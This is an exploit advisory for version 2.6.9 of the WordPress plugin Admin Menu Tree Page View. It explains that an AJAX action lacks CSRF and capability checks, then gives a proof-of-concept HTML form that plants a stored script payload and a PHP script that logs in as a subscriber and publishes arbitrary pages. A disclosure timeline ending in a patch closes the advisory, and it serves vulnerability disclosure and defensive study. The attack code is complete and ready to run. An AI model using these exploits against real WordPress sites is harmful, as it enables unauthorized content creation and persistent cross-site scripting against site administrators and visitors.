* Exploit Author: Panagiotis Vagenas
* Author Link: https://twitter.com/panVagenas
* Vendor Homepage: http://eskapism.se/
* Version: 2.6.9
* Tested on: WordPress 4.9.1
* Category: WebApps, WordPress
 
 
Description
-----------
 
Plugin implements AJAX action `admin_menu_tree_page_view_add_page` which
calls back the function `admin_menu_tree_page_view_add_page`. The later
does not implement any anti-CSRF controls or security checks.
 
Leveraging a CSRF attack an attacker could perform a Persistent XSS
attack if the victim has administrative rights (see PoC).
 
The AJAX action is a privileged one so it&#039;s only available for
registered users. Even so it doesn&#039;t implement any capabilities checks
so it&#039;s available to all users no matter the access level. This could
allow any registered user to create arbitrary posts no matter the access
level.
 
PoC
---
 
### CSRF -> Persistent XSS
 
In this PoC we exploit the `$_POST["page_titles"]` param to perform a
Persistent XSS attack.
 
```
    <input type="hidden" name="action" value="admin_menu_tree_page_view_add_page">
    <input type="text" name="type" value="after">
    <input type="text" name="pageID" value="1">
    <input type="text" name="post_type" value="page">
    <input type="text" name="page_titles[]" value="<script>alert(1)</script>">
    <input type="text" name="post_status" value="publish">
    <button type="submit" value="Submit">Submit</button>
</form>
 
```
 
### Create Arbitrary Posts
 
In this PoC we use a user with subscriber access to create arbitrary
pages. The post\_type is user defined so in the same manner we could
create any post type.
 
```
#!/usr/bin/env php
<?php
/*******************************************************************************
 * Admin Menu Tree Page View [Privilege Escalation]
 *
 * To install deps run `composer require wordfence/exkit`.
 *
 * @author Panagiotis Vagenas <pan.vagenas@gmail.com>
 * @date 2017-08-09
 ******************************************************************************/
 
require_once __DIR__ . &#039;/vendor/autoload.php&#039;;
 
use Wordfence\ExKit\Cli;
use Wordfence\ExKit\Config;
use Wordfence\ExKit\Endpoint;
use Wordfence\ExKit\ExitCodes;
use Wordfence\ExKit\WPAuthentication;
 
Config::get( &#039;url.base&#039;, null, true, &#039;Enter the site URL&#039; )
|| ExitCodes::exitWithFailedPrecondition( &#039;You must enter a valid URL&#039; );
 
$s = new \Wordfence\ExKit\Session( null, [], [], [ &#039;timeout&#039; => 60 ] );
$s->XDebugOn();
 
Cli::writeInfo( &#039;Logging in as subscriber...&#039; );
 
WPAuthentication::logInAsUserRole( $s,
WPAuthentication::USER_ROLE_SUBSCRIBER );
 
Cli::writeInfo( &#039;Sending payload...&#039; );
 
$postData = [
    &#039;action&#039;      => &#039;admin_menu_tree_page_view_add_page&#039;,
    &#039;type&#039;        => &#039;after&#039;,
    &#039;pageID&#039;      => &#039;1&#039;,
    &#039;post_type&#039;   => &#039;page&#039;,
    &#039;page_titles&#039; => [ &#039;<script>alert(1)</script>&#039; ],
    &#039;post_status&#039; => &#039;publish&#039;,
];
 
$r = $s->post( Endpoint::adminAjaxURL(), [], $postData);
 
if(!$r->success || !$r->body == &#039;0&#039;){
    ExitCodes::exitWithFailed(&#039;Failed to retrieve a valid response&#039;);
}
 
ExitCodes::exitWithSuccess(&#039;Exploitation successful&#039;);
 
```
 
Timeline
--------
 
1. **2017-12-12**: Discovered
2. **2017-12-12**: Tried to contact plugin author through WordPress.org
support threads
3. **2017-12-13**: Tried to contact plugin author by creating an issue
in plugin&#039;s repository on Github
4. **2017-12-13**: Vendor replied
5. **2017-12-14**: Vendor received details
6. **2018-01-07**: Patch released

